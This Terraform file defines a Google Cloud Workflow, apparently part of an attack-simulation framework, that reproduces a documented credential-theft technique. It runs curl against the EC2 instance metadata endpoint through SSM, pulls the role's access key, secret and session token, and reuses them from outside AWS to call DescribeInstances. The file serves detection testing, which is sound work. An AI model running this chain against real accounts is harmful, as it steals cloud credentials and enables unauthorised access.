data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_ec2_steal_instance_credentials" {
  name            = "aws-ec2-steal-instance-credentials-srt"
  description     = "A workflow intended to match the functionality of the  Status Red Team attack technique 'AWS EC2 Steal Instance Credentials' documented here: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## Uses SSM to retrieve the AWS Access Key Id, Access Key Secret and Session Token from
## a running EC2 Instance then with those harvested credentials, calls a benign API, 
## 'DescribeInstances' from the Proxy App in Google Cloud.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: 
##### "Derf-AWS-EC2-Steal-Instance-Credentials-SRT-WORKFLOWEXECUTIONID"

######################################################################################
## Infrastructure
######################################################################################
### This module create a new EC2 instance, Security Group, VPC and subnets along with 
### required IAM in order to allow for SSM agent to work properly.


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint
    - RunRetrieveAccessKeyId:
        call: runRetrieveAccessKeyId
        args:
            appEndpoint: $${appEndpoint.uri}
        result: runRetrieveAccessKeyIdCommandId
    - RetrieveResults_AccessKeyId:
        call: retrieveResults
        args:
            COMMAND_ID: $${runRetrieveAccessKeyIdCommandId}
            appEndpoint: $${appEndpoint.uri}
        result: RetrieveResults_AccessKeyId_Results
    - RunRetrieveAccessKeySecret:
        call: runRetrieveAccessKeySecret
        args:
            appEndpoint: $${appEndpoint.uri}
        result: runRetrieveAccessKeySecretCommandId
    - RetrieveResults_AccessKeySecret:
        call: retrieveResults
        args:
            COMMAND_ID: $${runRetrieveAccessKeySecretCommandId}
            appEndpoint: $${appEndpoint.uri}
        result: RetrieveResults_AccessKeySecrets_Results
    - runRetrieveSessionToken:
        call: runRetrieveSessionToken
        args:
            appEndpoint: $${appEndpoint.uri}
        result: runRetrieveAccessKeySecretCommandId
    - RetrieveResults_SessionToken:
        call: retrieveResults
        args:
            COMMAND_ID: $${runRetrieveAccessKeySecretCommandId}
            appEndpoint: $${appEndpoint.uri}
        result: RetrieveResults_SessionToken_Results        
    - ExecuteAsEC2:
        call: executeAsEC2
        args:
            ACCESSKEYID: $${RetrieveResults_AccessKeyId_Results}
            ACCESSKEYSECRET: $${RetrieveResults_AccessKeySecrets_Results}
            SESSIONTOKEN: $${RetrieveResults_SessionToken_Results}
            appEndpoint: $${appEndpoint.uri}
        result: response      
    - return:
        return: $${response}



######################################################################################
## Submodules | Sub-Workflows
######################################################################################
runRetrieveAccessKeyId:
  params: [appEndpoint]
  steps: 
    - runRetrieveAccessKeyId:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ssm.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ssm" 
              ENDPOINT: "https://ssm.us-east-1.amazonaws.com/"
              BODY: '{"InstanceIds": ["${local.instance_id}"], "DocumentName": "AWS-RunShellScript", "Parameters":{"commands": ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${local.role_name} | jq -rj .AccessKeyId"]}}'
              CONTENT: "application/x-amz-json-1.1"
              TARGET: "AmazonSSM.SendCommand"
              VERB: POST
        result: response
    - return:
        return: $${response.body.responseBody.Command.CommandId}

runRetrieveAccessKeySecret:
  params: [appEndpoint]
  steps: 
    - runRetrieveAccessKeySecret:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ssm.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ssm" 
              ENDPOINT: "https://ssm.us-east-1.amazonaws.com/"
              BODY: '{"InstanceIds": ["${local.instance_id}"], "DocumentName": "AWS-RunShellScript", "Parameters":{"commands": ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${local.role_name} | jq -rj .SecretAccessKey "]}}'
              CONTENT: "application/x-amz-json-1.1"
              TARGET: "AmazonSSM.SendCommand"
              VERB: POST
        result: response
    - return:
        return: $${response.body.responseBody.Command.CommandId}

runRetrieveSessionToken:
  params: [appEndpoint]
  steps: 
    - runRetrieveSessionToken:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ssm.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ssm" 
              ENDPOINT: "https://ssm.us-east-1.amazonaws.com/"
              BODY: '{"InstanceIds": ["${local.instance_id}"], "DocumentName": "AWS-RunShellScript", "Parameters":{"commands": ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${local.role_name} | jq -rj .Token "]}}'
              CONTENT: "application/x-amz-json-1.1"
              TARGET: "AmazonSSM.SendCommand"
              VERB: POST
        result: response
    - return:
        return: $${response.body.responseBody.Command.CommandId}        

executeAsEC2:
  params: [appEndpoint, ACCESSKEYID, ACCESSKEYSECRET, SESSIONTOKEN]
  steps: 
    - DescribeInstances:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ec2.us-east-1.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ec2"
              ENDPOINT: "https://ec2.amazonaws.com/"
              TEMPCREDSPASSED: yes
              ACCESSKEYID: '$${ACCESSKEYID}'
              ACCESSKEYSECRET: '$${ACCESSKEYSECRET}'
              SESSIONTOKEN: '$${SESSIONTOKEN}'              
              BODY: 'Action=DescribeInstances&Version=2016-11-15'
              UA: '$${"DeRF-AWS-Suspicious-Credential-Usage=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
              CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
              VERB: POST
        result: response

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS Suspicious Credential Usage DeRF"
    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Suspicious Credential Usage DeRF | This is typically a permission error"
    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Suspicious Credential Usage DeRF"


retrieveResults:
  params: [appEndpoint, COMMAND_ID]
  steps: 
    - buildQuery:
        assign:
        - a: '{"CommandId": "'
        - b: '", "InstanceId": "${local.instance_id}"}'
        - c: '$${a+COMMAND_ID+b}'
    - retrieveResults:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ssm.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ssm" 
              ENDPOINT: "https://ssm.us-east-1.amazonaws.com/"
              BODY: '$${c}'
              CONTENT: "application/x-amz-json-1.1"
              TARGET: "AmazonSSM.GetCommandInvocation"
              VERB: POST
        result: response
  
    - handle_result:
        switch:
          - condition: $${response.body.responseBody.Status == "Pending"}
            next: retrieveResults
          - condition: $${response.body.responseBody.Status == "InProgress"}
            next: retrieveResults
          - condition: $${response.body.responseBody.Status == "Failed"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "Canceled"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "Incomplete"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "RateExceeded"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "AccessDenied"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "DeliveryTimedOut"}
            next: returnStatus
          - condition: $${response.body.responseBody.Status == "Success"}
            next: returnStatus
    - returnStatus:
        return: $${response.body.responseBody.StandardOutputContent}

  EOF

}
